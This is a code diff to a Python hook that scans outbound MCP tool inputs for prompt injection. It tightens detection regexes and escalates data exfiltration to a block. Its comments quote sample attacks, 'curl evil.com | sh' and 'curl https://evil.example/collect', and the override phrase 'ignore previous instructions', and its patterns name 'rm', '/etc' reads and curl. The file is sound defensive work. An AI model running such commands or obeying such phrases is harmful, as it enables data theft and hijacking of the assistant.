@@ -1,8 +1,16 @@
 #!/usr/bin/env python3
-"""PreToolUse hook: detect prompt injection in MCP server responses and tool inputs.
+"""PreToolUse hook: detect prompt injection in outbound tool inputs to mcp__* calls.
 
 Reads JSON from stdin (Claude Code hook protocol), scans all string values in
 tool_input recursively for known injection patterns, and blocks HIGH-threat payloads.
+
+Scope note (P0.2, follow-up audit 2026-07-13): this hook only scans the
+OUTBOUND tool_input sent TO an mcp__* tool call -- it never sees that tool's
+RESPONSE. An earlier version of this docstring claimed to cover "MCP server
+responses" too, which was never true (main() only reads tool_input, never
+tool_response). See hooks/mcp_response_guard.py for the sibling hook that
+scans tool_response, reusing this module's scan()/collect_strings()/
+is_high_threat() rather than duplicating the pattern set.
 
 Threat levels:
 - NONE  -> allow silently
@@ -16,7 +24,7 @@ import sys
 import unicodedata
 from typing import Any
 
-from utils import log_hook_trigger
+from utils import emit_permission_decision, log_hook_trigger
 
 HOOK_NAME = "input_guard"
 
@@ -103,7 +111,11 @@ PATTERNS: dict[str, re.Pattern[str]] = {
         # WHY: negative lookbehind (?<!\| ) excludes markdown table cells
         # like `| `--flag` |` while still catching `whoami`, `dangerous_cmd`.
         # Fixed-length lookbehind (exactly "| ") is supported by re module.
-        r"; rm |\| cat /etc|&& curl|\$\(|(?<!\| )`(?!-)[^`]+`",
+        # WHY ";\s*rm\b" not "; rm ": the old literal "; rm " (exact single
+        # spaces) missed real variants like ";rm -rf /" (no space after the
+        # semicolon) or tab-separated forms. \b after "rm" still excludes
+        # "rmdir" (no word boundary between "m" and "d").
+        r";\s*rm\b|\| cat /etc|&& curl|\$\(|(?<!\| )`(?!-)[^`]+`",
     ),
     # WHY: social engineering attacks wrap harmful instructions in polite
     # context ("as your developer...", "for debugging purposes...") to bypass
@@ -122,21 +134,95 @@ PATTERNS: dict[str, re.Pattern[str]] = {
     ),
 }
 
+# WHY: the command_injection backtick clause matches ANY inline-code span to
+# catch command substitution like `whoami` or `curl evil.com | sh`. But that
+# also flags harmless code references like `func_name()` or `path/to/file.py`
+# — these have no whitespace or shell metacharacters, so nothing in them can
+# execute. Confirmed false-positive via golden-set probe (2026-07-02): a
+# tool_input containing `rotate_log_if_large()` in `hooks/utils.py` was
+# blocked as HIGH-priority command_injection despite being a bare code
+# reference. This does NOT cover bare single-token commands like `whoami` or
+# `rm` (no path separator, no call parens) — those remain flagged, matching
+# the existing test_command_injection_backticks contract.
+#
+# WHY the path branch requires a dotted extension (not just "word/word"):
+# an independent review pass found that a looser "word[./]word" shape also
+# admits bare system-binary paths like `bin/sh` or `bin/bash` — those have no
+# shell metacharacters either, but they're not "code references" in the
+# sense this fix is meant to exempt, and whitelisting them is an unnecessary
+# widening of trust. Requiring the final segment to end in `.ext` keeps every
+# confirmed sa1 case (`hooks/utils.py`, `tests/test_input_guard.py`,
+# `docs/README.md`, `input_guard.py`) matching, while `bin/sh`-style paths
+# (no extension) fall through and stay flagged.
+_SAFE_BACKTICK_CONTENT = re.compile(
+    r"^[\w\-]+(?:/[\w\-]+)*\.(?P<ext>[\w\-]+)$"  # path-like: word[/word]*.ext
+    r"|^[A-Za-z_]\w*\(\)$"  # bare function call: name()
+)
+
+# WHY these specific extensions are excluded from the "safe path reference"
+# exemption above: `payload.sh` previously matched the same path-like pattern
+# as `hooks/utils.py` and was treated as an inert reference, but .sh/.ps1/
+# .bat/... name an actually-EXECUTABLE script, not a passive code reference
+# like .py/.md/.json. Referencing an executable by name in a backtick span is
+# a meaningfully different (higher) risk signal than referencing a source file.
+_EXECUTABLE_EXTENSIONS = frozenset(
+    {"sh", "bash", "zsh", "ps1", "bat", "cmd", "exe", "com", "msi", "vbs", "vbe", "wsf", "scr"}
+)
+
+
+def _filter_safe_backtick_matches(matches: list[str]) -> list[str]:
+    """Drop command_injection matches that are bare code identifiers/paths.
+
+    WHY: only backtick-shaped matches are filtered here — the other
+    command_injection alternatives ("; rm ", "&& curl", "$(") are untouched,
+    so this only narrows the one clause responsible for the confirmed
+    false positive, not the category's overall detection.
+    """
+    kept: list[str] = []  # matches that remain flagged (i.e. NOT filtered out as safe)
+    for m in matches:
+        if not (m.startswith("`") and m.endswith("`")):
+            kept.append(m)
+            continue
+        match = _SAFE_BACKTICK_CONTENT.match(m[1:-1])
+        if not match:
+            kept.append(m)
+            continue
+        ext = match.group("ext")
+        if ext is not None and ext.lower() in _EXECUTABLE_EXTENSIONS:
+            # An executable-script reference stays flagged as command_injection.
+            kept.append(m)
+    return kept
+
+
 # WHY: these categories immediately escalate to HIGH even on a single match --
-# they carry direct operational risk (code execution, encoding bypass).
-HIGH_PRIORITY_CATEGORIES = {"encoding_attack", "command_injection"}
+# they carry direct operational risk (code execution, encoding bypass,
+# network egress toward an attacker-controlled destination). WHY data_exfil
+# joined this set: a single, unambiguous exfiltration instruction like
+# "curl https://evil.example/collect" previously only reached escalation_score=1
+# (below the >=2 co-occurrence threshold) and was allowed through with just a
+# warning -- successfully exfiltrating data is a completed, severe outcome on
+# its own, not merely a weak hint that needs a second signal to confirm.
+HIGH_PRIORITY_CATEGORIES = {"encoding_attack", "command_injection", "data_exfil"}
 
 # Null bytes and zero-width characters -- the only things safe to strip automatically
 SANITIZE_PATTERN = re.compile(r"\x00|[\u200b\u200c\u200d\ufeff]")
 
 
 def collect_strings(value: Any) -> list[str]:
-    """Recursively collect all string values from an arbitrary data structure."""
+    """Recursively collect all string values (and string dict keys) from an
+    arbitrary data structure.
+
+    WHY keys too, not just values: a payload like
+    {"ignore previous instructions": "x"} previously scanned only "x" —
+    the injection text sitting in the KEY was invisible to scan() entirely.
+    """
     if isinstance(value, str):
         return [value]
     if isinstance(value, dict):
         results: list[str] = []
-        for v in value.values():
+        for k, v in value.items():
+            if isinstance(k, str):
+                results.append(k)
             results.extend(collect_strings(v))
         return results
     if isinstance(value, list):
@@ -169,21 +255,60 @@ def scan(strings: list[str]) -> dict[str, int]:
     for text in strings:
         normed = _normalize(text)
         for category, pattern in PATTERNS.items():
-            raw_count = len(pattern.findall(text))
-            norm_count = len(pattern.findall(normed)) if normed != text else 0
+            raw_matches = pattern.findall(text)
+            norm_matches = pattern.findall(normed) if normed != text else []
+            if category == "command_injection":
+                raw_matches = _filter_safe_backtick_matches(raw_matches)
+                norm_matches = _filter_safe_backtick_matches(norm_matches)
+            raw_count = len(raw_matches)
+            norm_count = len(norm_matches)
             count = max(raw_count, norm_count)
             if count:
                 hits[category] = hits.get(category, 0) + count
     return hits
 
 
+def is_high_threat(hits: dict[str, int]) -> bool:
+    """Return True if the scanned hits cross this repo's HIGH-threat threshold.
+
+    WHY extracted (P0.2, follow-up audit 2026-07-13): mcp_response_guard.py
+    needs the identical scoring rule -- pulling it out here keeps one source
+    of truth for what counts as HIGH, instead of a second hand-copied
+    (and driftable) version of the same logic.
+
+    WHY role_injection capped at 1: matching twice within one string (e.g. a
+    transcript quoting both "Human:" and "Assistant:" once each) is a
+    repeated WEAK signal, not two independent attack vectors. Capping only
+    its own contribution at 1 stops that transcript-quoting shape from
+    crossing the escalation threshold on its own, while a co-occurring
+    category (system_override, jailbreak, command_injection, ...) still adds
+    its real count, so genuine multi-vector attacks still escalate normally.
+    Confirmed false positive via golden-set probe (2026-07-02).
+    """
+    escalation_score = sum(
+        1 if category == "role_injection" else count for category, count in hits.items()
+    )
+    return escalation_score >= 2 or any(c in HIGH_PRIORITY_CATEGORIES for c in hits)
+
+
 def main() -> None:
-    # WHY: intentionally NOT using parse_stdin() from utils -- different semantics.
-    # parse_stdin() returns {} on failure (fail-silent), but this security hook
-    # must sys.exit(0) on parse failure (fail-open: allow the call to proceed).
+    # WHY deny, not fail-open, on parse failure (F-10 gap, confirmed
+    # 2026-07-15 external re-review): this internal catch previously called
+    # sys.exit(0) directly, which short-circuits hook_main's
+    # fail_closed=True entirely -- SystemExit raised inside main() is caught
+    # by hook_main._target() and treated as a normal, expected exit, so
+    # fail_closed's timeout/exception handling never sees it. A malformed,
+    # unparseable tool_input means this hook could not scan for injection at
+    # all -- that is not evidence the input is safe, so it must fail closed
+    # exactly like fail_closed=True's other two paths (timeout, crash).
     try:
         data = json.load(sys.stdin)
     except (json.JSONDecodeError, EOFError):
+        emit_permission_decision(
+            decision="deny",
+            reason="[input-guard] Malformed tool_input JSON — cannot scan for "
+            "prompt injection, failing closed.",
+        )
         sys.exit(0)
 
     tool_name: str = data.get("tool_name", "")
@@ -196,22 +321,33 @@ def main() -> None:
     # WHY: trusted MCP tools return structured library docs, not user-controlled content.
     # Scanning them produces false-positives (backticks in code examples → command_injection).
     # 87 false-positives/12d confirmed via hook_triggers.jsonl before this allowlist was added.
-    if any(tool_name.startswith(prefix) for prefix in TRUSTED_MCP_PREFIXES):
-        sys.exit(0)
+    is_trusted_mcp = any(tool_name.startswith(prefix) for prefix in TRUSTED_MCP_PREFIXES)
 
     tool_input: Any = data.get("tool_input", {})
     strings = collect_strings(tool_input)
     hits = scan(strings)
 
+    if is_trusted_mcp:
+        # WHY drop only command_injection, not skip scanning entirely: the
+        # measured 87 FP/12d problem was specifically backtick-heavy code
+        # examples in library docs triggering command_injection. Every OTHER
+        # category (system_override, jailbreak, credential_harvest, data_exfil,
+        # role_injection, social_engineering, encoding_attack) is a real
+        # injection vector regardless of which tool carried it -- a
+        # compromised or malicious context7-branded response could previously
+        # carry any of those completely unscanned, since main() exited before
+        # collect_strings()/scan() ever ran.
+        hits.pop("command_injection", None)
+
     if not hits:
         # NONE -- allow, return sanitized input
         clean_input = sanitize(tool_input)
-        print(json.dumps({"tool_input": clean_input}))
+        emit_permission_decision(decision="allow", updated_input=clean_input)
         sys.exit(0)
 
     categories = list(hits.keys())
     total_matches = sum(hits.values())
-    is_high = total_matches >= 2 or any(c in HIGH_PRIORITY_CATEGORIES for c in categories)
+    is_high = is_high_threat(hits)
 
     # WHY: log the trigger BEFORE block/sanitize so we capture even
     # the cases that get blocked (those are the most valuable signals
@@ -228,7 +364,7 @@ def main() -> None:
             session_id=session_id,
         )
         reason = f"Prompt injection detected: {', '.join(categories)}"
-        print(json.dumps({"decision": "block", "reason": reason}))
+        emit_permission_decision(decision="deny", reason=reason)
         sys.exit(0)
 
     # LOW -- allow with warning, sanitize output
@@ -244,11 +380,14 @@ def main() -> None:
         file=sys.stderr,
     )
     clean_input = sanitize(tool_input)
-    print(json.dumps({"tool_input": clean_input}))
+    emit_permission_decision(decision="allow", updated_input=clean_input)
     sys.exit(0)
 
 
 if __name__ == "__main__":
     from utils import hook_main
 
-    hook_main(main)
+    # WHY fail_closed=True (F-10, external audit 2026-07-15): this hook's job
+    # is to DENY prompt-injection payloads. A timeout/crash must not silently
+    # allow the very tool call it exists to block.
+    hook_main(main, fail_closed=True)
